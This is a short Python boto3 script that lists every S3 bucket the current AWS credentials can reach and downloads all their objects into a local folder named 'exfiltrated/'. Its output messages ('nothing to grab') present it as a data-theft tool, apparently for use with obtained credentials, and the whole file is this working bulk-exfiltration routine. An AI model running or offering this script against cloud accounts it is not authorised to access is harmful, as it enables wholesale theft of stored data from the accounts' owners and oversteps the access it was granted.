import boto3 
client = boto3.client('s3')
response = client.list_buckets()
print(response)

for bucket in response['Buckets']:
    #Finds what buckets are there and prints them
    bucket_name = bucket['Name']
    print(f"Found bucket: {bucket_name}")
    objects = client.list_objects_v2(Bucket=bucket['Name'])
    if 'Contents' not in objects:
        print(f"  (empty bucket, nothing to grab)")
        continue

    for obj in objects['Contents']:
        filename= obj['Key']
        print(f"found file: {filename}")
        client.download_file(bucket_name,filename,f"exfiltrated/{filename}")
        print(f"Downloaded: {filename}")